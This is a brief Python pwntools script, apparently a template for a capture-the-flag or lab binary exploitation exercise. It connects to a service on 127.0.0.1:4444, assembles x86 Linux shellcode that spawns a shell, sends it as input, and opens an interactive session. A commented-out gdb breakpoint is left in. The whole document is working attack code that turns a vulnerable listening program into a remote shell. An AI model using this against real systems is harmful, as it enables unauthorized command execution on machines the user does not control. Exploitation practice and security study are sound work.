import sys
from pwn import * # pip install pwntools

context(arch='x86', os='linux')

HOST = '127.0.0.1'
PORT = 4444

## Example
r = remote(HOST, PORT)

'''
gdb.attach(r, """
bp 80484fa
c
""")
'''

shellcode = asm(shellcraft.sh())

r.sendline(shellcode)

r.interactive()
